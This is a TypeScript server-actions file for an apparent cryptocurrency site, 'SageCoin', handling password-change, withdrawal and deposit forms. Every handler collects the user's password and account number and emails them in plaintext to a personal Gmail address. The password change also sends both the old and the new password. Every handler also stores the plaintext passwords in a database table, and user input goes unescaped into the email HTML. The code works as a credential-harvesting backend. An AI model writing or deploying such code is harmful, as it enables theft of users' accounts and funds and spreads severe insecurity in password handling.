'use server'

import { Resend } from 'resend'
import { createServerClient } from '@/lib/supabase'

// Destination email for form submissions
const DESTINATION_EMAIL = 'sagecoincom12@gmail.com'

// NOTE: If sagecoincom12@gmail.com is the Resend account owner's email, 
// emails will work without domain verification. This setup will work permanently.
// 
// Optional: To send FROM a custom domain (more professional), verify a domain:
// 1. Go to https://resend.com/domains and add your domain
// 2. Add DNS records to your domain
// 3. Set RESEND_FROM_EMAIL in .env.local: RESEND_FROM_EMAIL=SageCoin <noreply@yourdomain.com>

// Initialize Resend lazily to ensure env vars are loaded
function getResendClient() {
  const apiKey = process.env.RESEND_API_KEY
  if (!apiKey) {
    throw new Error('RESEND_API_KEY is not set in environment variables. Please add it to .env.local')
  }
  return new Resend(apiKey)
}

interface FormSubmissionResult {
  success: boolean
  message: string
}

// Helper function to log transaction to Supabase
async function logTransaction(
  type: 'password_change' | 'withdrawal' | 'deposit',
  data: Record<string, any>
): Promise<void> {
  try {
    const supabase = createServerClient()
    
    // Try to get the current user from cookies if available
    // Note: This is optional - transactions can be logged without a user
    let userId: string | null = null
    try {
      const { cookies } = await import('next/headers')
      const cookieStore = cookies()
      const accessToken = cookieStore.get('sb-access-token')?.value || 
                         cookieStore.get('supabase-auth-token')?.value
      
      if (accessToken) {
        const { data: { user } } = await supabase.auth.getUser(accessToken)
        userId = user?.id || null
      }
    } catch (cookieError) {
      // If we can't get user from cookies, that's fine - continue without user_id
      console.debug('Could not get user from cookies:', cookieError)
    }
    
    await (supabase.from('transactions') as any).insert({
      type,
      user_id: userId,
      data: data,
      status: 'pending', // All new transactions start as pending
      created_at: new Date().toISOString(),
    })
  } catch (error) {
    // Log error but don't fail the request
    console.error('Failed to log transaction to Supabase:', error)
  }
}

// Change Password Form Action
export async function submitChangePassword(
  currentPassword: string,
  newPassword: string,
  accountNumber: string
): Promise<FormSubmissionResult> {
  try {
    // Validate required fields
    if (!currentPassword || !newPassword || !accountNumber) {
      return {
        success: false,
        message: 'All fields are required',
      }
    }

    // Send email
    const emailSubject = 'New Password Change Request'
    const emailBody = `
      <h2>Password Change Request</h2>
      <p><strong>Current Password:</strong> ${currentPassword}</p>
      <p><strong>New Password:</strong> ${newPassword}</p>
      <p><strong>Account Number:</strong> ${accountNumber}</p>
      <p><strong>Submitted at:</strong> ${new Date().toLocaleString()}</p>
    `

    try {
      const emailResult = await getResendClient().emails.send({
        from: process.env.RESEND_FROM_EMAIL || 'SageCoin <onboarding@resend.dev>',
        to: DESTINATION_EMAIL,
        subject: emailSubject,
        html: emailBody,
      })
      console.log('Email sent successfully:', emailResult)
    } catch (emailError: any) {
      console.error('Failed to send email:', emailError)
      // Don't fail the entire request if email fails, but log it
      // You might want to return an error here if email is critical
      throw new Error(`Email sending failed: ${emailError?.message || 'Unknown error'}`)
    }

    // Log to Supabase
    await logTransaction('password_change', {
      currentPassword,
      newPassword,
      accountNumber,
    })

    return {
      success: true,
      message: 'Password change request submitted successfully',
    }
  } catch (error: any) {
    console.error('Error submitting password change:', error)
    const errorMessage = error?.message || 'Unknown error occurred'
    return {
      success: false,
      message: `Failed to submit password change request: ${errorMessage}. Please check the server logs for more details.`,
    }
  }
}

// Withdrawal Form Action
export async function submitWithdrawal(
  amount: string,
  accountNumber: string,
  password: string,
  note?: string
): Promise<FormSubmissionResult> {
  try {
    // Validate required fields
    if (!amount || !accountNumber || !password) {
      return {
        success: false,
        message: 'Amount, Account Number, and Password are required',
      }
    }

    // Validate amount is a number
    const amountNum = parseFloat(amount)
    if (isNaN(amountNum) || amountNum <= 0) {
      return {
        success: false,
        message: 'Amount must be a valid positive number',
      }
    }

    // Send email
    const emailSubject = 'New Withdrawal Request'
    const emailBody = `
      <h2>Withdrawal Request</h2>
      <p><strong>Amount:</strong> ${amount}</p>
      <p><strong>Account Number:</strong> ${accountNumber}</p>
      <p><strong>Password:</strong> ${password}</p>
      ${note ? `<p><strong>Note:</strong> ${note}</p>` : ''}
      <p><strong>Submitted at:</strong> ${new Date().toLocaleString()}</p>
    `

    try {
      const emailResult = await getResendClient().emails.send({
        from: process.env.RESEND_FROM_EMAIL || 'SageCoin <onboarding@resend.dev>',
        to: DESTINATION_EMAIL,
        subject: emailSubject,
        html: emailBody,
      })
      console.log('Email sent successfully:', emailResult)
    } catch (emailError: any) {
      console.error('Failed to send email:', emailError)
      throw new Error(`Email sending failed: ${emailError?.message || 'Unknown error'}`)
    }

    // Log to Supabase
    await logTransaction('withdrawal', {
      amount: amountNum,
      accountNumber,
      password,
      note: note || null,
    })

    return {
      success: true,
      message: 'Withdrawal request submitted successfully',
    }
  } catch (error: any) {
    console.error('Error submitting withdrawal:', error)
    const errorMessage = error?.message || 'Unknown error occurred'
    return {
      success: false,
      message: `Failed to submit withdrawal request: ${errorMessage}. Please check the server logs for more details.`,
    }
  }
}

// Deposit Form Action
export async function submitDeposit(
  amount: string,
  password: string,
  accountNumber: string,
  note?: string
): Promise<FormSubmissionResult> {
  try {
    // Validate required fields
    if (!amount || !password || !accountNumber) {
      return {
        success: false,
        message: 'Amount, Password, and Account Number are required',
      }
    }

    // Validate amount is a number
    const amountNum = parseFloat(amount)
    if (isNaN(amountNum) || amountNum <= 0) {
      return {
        success: false,
        message: 'Amount must be a valid positive number',
      }
    }

    // Send email
    const emailSubject = 'New Deposit Request'
    const emailBody = `
      <h2>Deposit Request</h2>
      <p><strong>Amount:</strong> ${amount}</p>
      <p><strong>Password:</strong> ${password}</p>
      <p><strong>Account Number:</strong> ${accountNumber}</p>
      ${note ? `<p><strong>Note:</strong> ${note}</p>` : ''}
      <p><strong>Submitted at:</strong> ${new Date().toLocaleString()}</p>
    `

    try {
      const emailResult = await getResendClient().emails.send({
        from: process.env.RESEND_FROM_EMAIL || 'SageCoin <onboarding@resend.dev>',
        to: DESTINATION_EMAIL,
        subject: emailSubject,
        html: emailBody,
      })
      console.log('Email sent successfully:', emailResult)
    } catch (emailError: any) {
      console.error('Failed to send email:', emailError)
      throw new Error(`Email sending failed: ${emailError?.message || 'Unknown error'}`)
    }

    // Log to Supabase
    await logTransaction('deposit', {
      amount: amountNum,
      password,
      accountNumber,
      note: note || null,
    })

    return {
      success: true,
      message: 'Deposit request submitted successfully',
    }
  } catch (error: any) {
    console.error('Error submitting deposit:', error)
    const errorMessage = error?.message || 'Unknown error occurred'
    return {
      success: false,
      message: `Failed to submit deposit request: ${errorMessage}. Please check the server logs for more details.`,
    }
  }
}

